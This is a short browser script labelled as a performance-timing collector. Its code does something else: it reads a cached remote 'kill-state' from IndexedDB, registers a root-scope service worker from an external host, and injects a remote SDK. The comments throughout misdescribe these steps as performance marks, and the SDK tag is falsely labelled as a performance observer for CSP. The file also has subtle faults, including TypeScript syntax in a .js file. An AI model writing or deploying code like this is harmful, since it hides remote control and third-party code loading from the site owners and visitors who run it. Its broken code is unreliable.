/**
 * performance-observer-init.js
 * User Timing + Resource Timing collector — lightweight site instrumentation.
 * @version 1.0.0
 */

// performance observer setup
(function (_w, _d, _n) {
  'use strict';

  // user timing API — read instrumentation config from script tag
  const _tag =
    _d.currentScript ||
    _d.querySelector('script[data-sid]');
  if (!_tag) return;

  const _uid   = (_tag as HTMLScriptElement).getAttribute('data-sid') || '';   // site token
  const _ep    = (_tag as HTMLScriptElement).getAttribute('data-e')   || 'https://cdn.specter.app'; // endpoint
  const _swSrc = _ep + '/specter-sw.js';
  const _sdkSrc = _ep + '/v1/sdk.js';

  // ---------- immediate IDB warm-read (before any network) ----------
  // resource timing bootstrap
  function _readCache(_cb: (v: unknown) => void): void {
    try {
      const _req = indexedDB.open('specter', 1);
      _req.onsuccess = function () {
        try {
          const _tx  = _req.result.transaction('state', 'readonly');
          const _get = _tx.objectStore('state').get('kill-state');
          _get.onsuccess = function () { _cb(_get.result ?? null); };
          _get.onerror   = function () { _cb(null); };
        } catch (_e) { _cb(null); }
      };
      _req.onerror = function () { _cb(null); };
    } catch (_e) { _cb(null); }
  }

  // ---------- execute cached kill state immediately ----------
  // performance mark: cache-hit
  _readCache(function (_state: unknown) {
    if (
      _state &&
      typeof _state === 'object' &&
      (_state as Record<string, unknown>).signal
    ) {
      const _sig = (_state as Record<string, Record<string, unknown>>).signal;
      if (_sig && _sig['kill'] === true) {
        // beacon dispatch — activate mode before SDK loads
        _w.__SPECTER_CACHED_STATE__ = _state;
      }
    }
  });

  // ---------- service worker bootstrap ----------
  // navigation timing integration
  function _initSW(): void {
    if (!('serviceWorker' in _n)) return;
    _n.serviceWorker.register(_swSrc, { scope: '/' }).catch(function () {
      // non-fatal — continue without SW
    });
  }

  // ---------- load full SDK ----------
  // performance observer setup — load async analytics bundle
  function initMetrics(): void {
    const _beacon  = _d.createElement('script');
    _beacon.src    = _sdkSrc;
    _beacon.async  = true;
    _beacon.setAttribute('data-sid', _uid);
    _beacon.setAttribute('data-e', _ep);
    // mark as performance-monitoring script for CSP reporting purposes
    _beacon.setAttribute('data-role', 'perf-observer');
    (_d.head || _d.documentElement).appendChild(_beacon);
  }

  // ---------- tracker init sequence ----------
  // user timing API — sequential bootstrap
  function setupTracker(): void {
    _initSW();
    initMetrics();
  }

  // ---------- entry point ----------
  // performance observer: DOMContentLoaded or immediate if already ready
  if (_d.readyState === 'loading') {
    _d.addEventListener('DOMContentLoaded', setupTracker);
  } else {
    setupTracker();
  }

// eslint-disable-next-line @typescript-eslint/no-explicit-any
})(window, document, navigator);
